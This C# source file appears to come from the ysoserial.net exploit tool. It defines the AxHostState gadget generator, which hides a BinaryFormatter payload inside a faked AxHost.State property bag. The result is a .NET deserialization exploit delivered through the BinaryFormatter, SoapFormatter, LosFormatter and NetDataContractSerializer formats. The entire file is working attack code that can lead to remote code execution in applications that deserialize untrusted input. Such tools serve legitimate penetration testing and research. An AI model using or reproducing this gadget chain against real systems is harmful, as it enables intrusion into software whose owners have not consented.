using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    public class AxHostStateGenerator : GenericGenerator
    {
        public override string Name()
        {
            return "AxHostState";
        }

        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.BridgeAndDerived };
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "SoapFormatter", "LosFormatter", "NetDataContractSerializer"};
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                IGenerator generator = new TextFormattingRunPropertiesGenerator();
                binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs); // we could have used AxHostStateGeneratorGadget directly here but it wouldn't have passed our other potential filters using the user input
            }

            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);

            AxHostStateMarshal payloadAxHostMarshal = new AxHostStateMarshal(Convert.FromBase64String(b64encoded));

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
            {
                return Serialize(payloadAxHostMarshal, formatter, inputArgs);
            }
            else if(formatter.Equals("NetDataContractSerializer", StringComparison.OrdinalIgnoreCase))
            {
                string utfString = System.Text.Encoding.UTF8.GetString((byte[])SerializeWithNoTest(payloadAxHostMarshal, formatter, inputArgs));

                string payload = SerializersHelper.NetDataContractSerializer_Marshal_2_MainType(utfString);

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlHelper.Minify(payload, new string[] { "mscorlib", "Microsoft.PowerShell.Editor"}, null, FormatterType.NetDataContractXML, true);
                    }
                    else
                    {
                        payload = XmlHelper.Minify(payload, null, null, FormatterType.NetDataContractXML, true);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.NetDataContractSerializer_deserialize(payload);
                    }
                    catch(Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                    
                }

                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }

    [Serializable]
    public class AxHostStateMarshal : ISerializable
    {
        byte[] _fakePropertyBagBinary;

        public void SetFakePropertyBagBinary(byte[] bfPayload)
        {
            _fakePropertyBagBinary = bfPayload;
        }

        public AxHostStateMarshal(byte[] bfPayload)
        {
            SetFakePropertyBagBinary(bfPayload);
        }

        public AxHostStateMarshal(object fakePropertyBagBinary, InputArgs inputArgs)
        {
            MemoryStream stm = new MemoryStream();
            if (inputArgs.Minify)
            {
                ysoserial.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter fmtLocal = new ysoserial.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter();
                fmtLocal.Serialize(stm, fakePropertyBagBinary);
            }
            else
            {
                BinaryFormatter fmt = new BinaryFormatter();
                fmt.Serialize(stm, fakePropertyBagBinary);
            }
            
            SetFakePropertyBagBinary(stm.ToArray());
        }

        public AxHostStateMarshal(object fakePropertyBagBinary):this(fakePropertyBagBinary, new InputArgs())
        {
            // This won't use anything we might have defined in ysoserial.net BinaryFormatter process (such as minification)
        }

        public AxHostStateMarshal(MemoryStream ms)
        {
            SetFakePropertyBagBinary(ms.ToArray());
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(System.Windows.Forms.AxHost.State));
            info.AddValue("PropertyBagBinary", _fakePropertyBagBinary); // This is in form of byte[] - it will be deserialized by BinaryFormatter upon deserialization
        }
    }
}
